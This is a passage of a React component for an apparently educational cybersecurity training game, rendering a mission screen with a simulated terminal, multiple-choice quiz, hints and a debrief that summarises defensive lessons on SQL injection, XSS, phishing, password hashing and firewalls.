              ← ABORT MISSION
            </button>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 16 }}>{topicInfo.icon}</span>
              <span style={{ fontSize: 14, color: topicInfo.color, fontWeight: 700 }}>
                {currentMission.title}
              </span>
            </div>
            <div style={{ fontSize: 11, color: "#3a6a4a" }}>
              Phase {currentPhase + 1}/{currentMission.phases.length}
            </div>
          </div>

          {/* Phase progress bar */}
          <div style={{
            display: "flex", gap: 4, marginBottom: 20,
          }}>
            {currentMission.phases.map((_, i) => (
              <div key={i} style={{
                flex: 1, height: 3, borderRadius: 2,
                background: i < currentPhase ? "#00ff88" :
                  i === currentPhase ? "rgba(0,255,136,0.4)" : "#0a1a0e",
                transition: "background 0.3s",
              }} />
            ))}
          </div>

          {/* Briefing (show on first phase) */}
          {currentPhase === 0 && !terminalHistory.length && !selectedAnswer && (
            <div style={{
              background: "rgba(0,255,136,0.03)",
              border: "1px solid rgba(0,255,136,0.1)",
              borderRadius: 8, padding: 20, marginBottom: 20,
            }}>
              <div style={{
                fontSize: 10, color: "#00ff88", letterSpacing: "0.15em",
                textTransform: "uppercase", marginBottom: 10,
              }}>
                ◆ MISSION BRIEFING
              </div>
              <div style={{
                fontSize: 13, color: "#8ab89a", lineHeight: 1.7,
                whiteSpace: "pre-line",
              }}>
                {currentMission.briefing}
              </div>
            </div>
          )}

          {/* === TERMINAL PHASE === */}
          {phase.type === "terminal" && (
            <div>
              <div style={{
                background: "#080c0a",
                border: "1px solid rgba(0,255,136,0.12)",
                borderRadius: 8, overflow: "hidden",
              }}>
                {/* Terminal header */}
                <div style={{
                  padding: "8px 14px",
                  background: "rgba(0,255,136,0.06)",
                  borderBottom: "1px solid rgba(0,255,136,0.08)",
                  display: "flex", alignItems: "center", gap: 8,
                }}>
                  <div style={{ width: 8, height: 8, borderRadius: "50%", background: "#ff5f56" }} />
                  <div style={{ width: 8, height: 8, borderRadius: "50%", background: "#ffbd2e" }} />
                  <div style={{ width: 8, height: 8, borderRadius: "50%", background: "#27c93f" }} />
                  <span style={{ fontSize: 11, color: "#3a6a4a", marginLeft: 8 }}>
                    cyberops@kali:~$
                  </span>
                </div>

                {/* Terminal body */}
                <div ref={termRef} style={{
                  padding: 16, minHeight: 200, maxHeight: 400, overflowY: "auto",
                }}>
                  {/* Prompt */}
                  <div style={{
                    fontSize: 13, color: "#7aaa8a", lineHeight: 1.6,
                    whiteSpace: "pre-line", marginBottom: 16,
                  }}>
                    {phase.prompt}
                  </div>

                  {/* History */}
                  {terminalHistory.map((entry, i) => (
                    <div key={i} style={{ marginBottom: 10 }}>
                      {entry.type === "input" && (
                        <div style={{ color: "#00ff88", fontSize: 13 }}>
                          <span style={{ color: "#3a6a4a" }}>$ </span>{entry.text}
                        </div>
                      )}
                      {entry.type === "success" && (
                        <div style={{
                          color: "#00ff88", fontSize: 12, lineHeight: 1.6,
                          whiteSpace: "pre-line", padding: "10px 12px",
                          background: "rgba(0,255,136,0.04)",
                          borderLeft: "3px solid #00ff88",
                          borderRadius: "0 4px 4px 0", marginTop: 6,
                        }}>
                          ✓ {entry.text}
                        </div>
                      )}
                      {entry.type === "error" && (
                        <div style={{
                          color: "#ff6b6b", fontSize: 12, lineHeight: 1.6,
                          whiteSpace: "pre-line", padding: "10px 12px",
                          background: "rgba(255,100,100,0.04)",
                          borderLeft: "3px solid #ff6b6b",
                          borderRadius: "0 4px 4px 0", marginTop: 6,
                        }}>
                          ✗ {entry.text}
                        </div>
                      )}
                    </div>
                  ))}

                  {/* Input line */}
                  {phaseResult !== "success" && (
                    <div style={{ display: "flex", alignItems: "center", gap: 8, marginTop: 8 }}>
                      <span style={{ color: "#00ff88", fontSize: 13 }}>$</span>
                      <input
                        ref={inputRef}
                        value={terminalInput}
                        onChange={e => setTerminalInput(e.target.value)}
                        onKeyDown={e => e.key === "Enter" && handleTerminalSubmit()}
                        style={{
                          flex: 1, background: "none", border: "none",
                          color: "#00ff88", fontSize: 13,
                          fontFamily: "inherit", outline: "none",
                          caretColor: "#00ff88",
                        }}
                        placeholder="Type your command..."
                        autoFocus
                      />
                    </div>
                  )}
                </div>
              </div>

              {/* Hint toggle */}
              <div style={{ marginTop: 12, display: "flex", gap: 10 }}>
                <button onClick={() => setShowHint(!showHint)} style={{
                  background: "none", border: "1px solid rgba(255,217,61,0.2)",
                  color: "#ffd93d", fontSize: 11, padding: "6px 14px",
                  borderRadius: 4, cursor: "pointer", fontFamily: "inherit",
                }}>
                  {showHint ? "▾ HIDE HINT" : "▸ SHOW HINT"}
                </button>
                {phaseResult === "success" && (
                  <button onClick={nextPhase} style={{
                    background: "rgba(0,255,136,0.1)", border: "1px solid rgba(0,255,136,0.3)",
                    color: "#00ff88", fontSize: 12, padding: "6px 18px",
                    borderRadius: 4, cursor: "pointer", fontFamily: "inherit",
                    fontWeight: 700,
                  }}>
                    CONTINUE →
                  </button>
                )}
              </div>
              {showHint && (
                <div style={{
                  marginTop: 8, padding: 12, fontSize: 12,
                  color: "#ffd93d", background: "rgba(255,217,61,0.04)",
                  border: "1px solid rgba(255,217,61,0.12)",
                  borderRadius: 6, lineHeight: 1.6,
                }}>
                  💡 {phase.hint}
                </div>
              )}
            </div>
          )}

          {/* === QUIZ PHASE === */}
          {phase.type === "quiz" && (
            <div>
              <div style={{
                background: "rgba(255,255,255,0.02)",
                border: "1px solid rgba(255,255,255,0.06)",
                borderRadius: 8, padding: 20, marginBottom: 16,
              }}>
                <div style={{
                  fontSize: 10, color: "#6bc5ff", letterSpacing: "0.15em",
                  textTransform: "uppercase", marginBottom: 12,
                }}>
                  ◆ KNOWLEDGE CHECK
                </div>
                <div style={{
                  fontSize: 14, color: "#c0e0d0", lineHeight: 1.7,
                  whiteSpace: "pre-line",
                }}>
                  {phase.question}
                </div>
              </div>

              {/* Options */}
              <div style={{ display: "flex", flexDirection: "column", gap: 8, marginBottom: 16 }}>
                {phase.options.map((opt, i) => {
                  const isSelected = selectedAnswer === i;
                  const isCorrect = opt.correct;
                  const showResult = selectedAnswer !== null;

                  let bg = "rgba(255,255,255,0.02)";
                  let borderColor = "rgba(255,255,255,0.06)";
                  let textColor = "#a0c0a0";

                  if (showResult) {
                    if (isCorrect) {
                      bg = "rgba(0,255,136,0.08)";
                      borderColor = "rgba(0,255,136,0.4)";
                      textColor = "#00ff88";
                    } else if (isSelected && !isCorrect) {
                      bg = "rgba(255,100,100,0.08)";
                      borderColor = "rgba(255,100,100,0.4)";
                      textColor = "#ff6b6b";
                    } else {
                      textColor = "#3a5a4a";
                    }
                  }

                  return (
                    <button key={i} onClick={() => handleQuizAnswer(i)} style={{
                      background: bg, border: "1px solid", borderColor,
                      borderRadius: 6, padding: "12px 16px",
                      textAlign: "left", cursor: showResult ? "default" : "pointer",
                      color: textColor, fontSize: 13, fontFamily: "inherit",
                      lineHeight: 1.5, transition: "all 0.15s",
                      display: "flex", alignItems: "flex-start", gap: 10,
                    }}
                    onMouseEnter={e => { if (!showResult) { e.currentTarget.style.borderColor = "#00ff88"; e.currentTarget.style.color = "#c0f0c0"; } }}
                    onMouseLeave={e => { if (!showResult) { e.currentTarget.style.borderColor = "rgba(255,255,255,0.06)"; e.currentTarget.style.color = "#a0c0a0"; } }}
                    >
                      <span style={{
                        minWidth: 22, height: 22, borderRadius: 4,
                        display: "flex", alignItems: "center", justifyContent: "center",
                        fontSize: 11, border: "1px solid",
                        borderColor: showResult && isCorrect ? "#00ff88" : showResult && isSelected ? "#ff6b6b" : "rgba(255,255,255,0.1)",
                        color: showResult && isCorrect ? "#00ff88" : showResult && isSelected ? "#ff6b6b" : "#4a6a5a",
                        flexShrink: 0,
                      }}>
                        {showResult && isCorrect ? "✓" : showResult && isSelected && !isCorrect ? "✗" : String.fromCharCode(65 + i)}
                      </span>
                      {opt.text}
                    </button>
                  );
                })}
              </div>

              {/* Explanation */}
              {showExplanation && (
                <div style={{
                  background: "rgba(0,255,136,0.03)",
                  border: "1px solid rgba(0,255,136,0.12)",
                  borderRadius: 8, padding: 18, marginBottom: 16,
                }}>
                  <div style={{
                    fontSize: 10, color: "#00ff88", letterSpacing: "0.15em",
                    textTransform: "uppercase", marginBottom: 10,
                  }}>
                    ◆ EXPLANATION
                  </div>
                  <div style={{
                    fontSize: 13, color: "#8ab89a", lineHeight: 1.7,
                    whiteSpace: "pre-line",
                  }}>
                    {phase.explanation}
                  </div>
                </div>
              )}

              {selectedAnswer !== null && (
                <button onClick={nextPhase} style={{
                  background: "rgba(0,255,136,0.1)",
                  border: "1px solid rgba(0,255,136,0.3)",
                  color: "#00ff88", fontSize: 12, padding: "8px 22px",
                  borderRadius: 4, cursor: "pointer", fontFamily: "inherit",
                  fontWeight: 700,
                }}>
                  {currentPhase < currentMission.phases.length - 1 ? "NEXT PHASE →" : "COMPLETE MISSION →"}
                </button>
              )}
            </div>
          )}
        </div>
      )}

      {/* === DEBRIEF SCREEN === */}
      {screen === "debrief" && currentMission && (
        <div style={{
          maxWidth: 600, margin: "0 auto", padding: "60px 16px",
          textAlign: "center", position: "relative", zIndex: 10,
        }}>
          <div style={{
            fontSize: 48, marginBottom: 16,
            animation: "pulseGlow 2s ease-in-out infinite",
          }}>
            {TOPICS[currentMission.topic].icon}
          </div>
          <div style={{
            fontSize: 10, color: "#00ff88", letterSpacing: "0.3em",
            textTransform: "uppercase", marginBottom: 8,
          }}>
            MISSION COMPLETE
          </div>
          <h2 style={{
            fontSize: 28, color: "#e0f0e0", fontWeight: 700,
            margin: "0 0 8px 0",
          }}>
            {currentMission.title}
          </h2>
          <div style={{ fontSize: 14, color: "#4a7a5a", marginBottom: 32 }}>
            {currentMission.subtitle}
          </div>

          <div style={{
            background: "rgba(0,255,136,0.04)",
            border: "1px solid rgba(0,255,136,0.15)",
            borderRadius: 8, padding: 24, marginBottom: 24,
            display: "inline-block", minWidth: 240,
          }}>
            <div style={{ fontSize: 36, color: "#ffd93d", fontWeight: 700 }}>
              +{missionXpEarned} XP
            </div>
            <div style={{ fontSize: 12, color: "#4a7a5a", marginTop: 6 }}>
              Rank: Lvl {level} — {levelTitle}
            </div>
          </div>

          <div style={{ marginBottom: 24 }}>
            <div style={{
              fontSize: 12, color: "#5a8a6a", lineHeight: 1.8,
              maxWidth: 400, margin: "0 auto",
            }}>
              {currentMission.topic === "WEB" && "You now understand how SQL injection and XSS attacks work — and more importantly, how to defend against them."}
              {currentMission.topic === "SOCIAL" && "You can now identify phishing attempts and understand why security awareness training is crucial."}
              {currentMission.topic === "PASSWD" && "You understand why password hashing matters and why length beats complexity."}
              {currentMission.topic === "NETWORK" && "You know the basics of network reconnaissance and why authorization is everything in ethical hacking."}
              {currentMission.topic === "FIREWALL" && "You can configure basic firewall rules and understand the difference between firewalls and intrusion detection systems."}
            </div>
          </div>

          <div style={{ display: "flex", gap: 12, justifyContent: "center", flexWrap: "wrap" }}>
            <button onClick={() => setScreen("hub")} style={{
              background: "rgba(0,255,136,0.1)", border: "1px solid rgba(0,255,136,0.3)",
              color: "#00ff88", fontSize: 13, padding: "10px 28px",
              borderRadius: 6, cursor: "pointer", fontFamily: "inherit",
              fontWeight: 700,
            }}>
              ← MISSION HUB
            </button>
            {currentMission && MISSIONS.indexOf(currentMission) < MISSIONS.length - 1 && (
              <button onClick={() => startMission(MISSIONS[MISSIONS.indexOf(currentMission) + 1])} style={{
                background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.1)",
                color: "#8ab89a", fontSize: 13, padding: "10px 28px",
                borderRadius: 6, cursor: "pointer", fontFamily: "inherit",
              }}>
                NEXT MISSION →
              </button>
            )}
          </div>
        </div>
      )}

      <style>{`
        @keyframes pulseGlow {
          0%, 100% { filter: drop-shadow(0 0 8px rgba(0,255,136,0.3)); }
          50% { filter: drop-shadow(0 0 20px rgba(0,255,136,0.6)); }
        }
        input::placeholder {
          color: #2a4a3a;
        }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0a0e0c; }
        ::-webkit-scrollbar-thumb { background: #1a3a2a; border-radius: 3px; }
      `}</style>
    </div>
  );
}
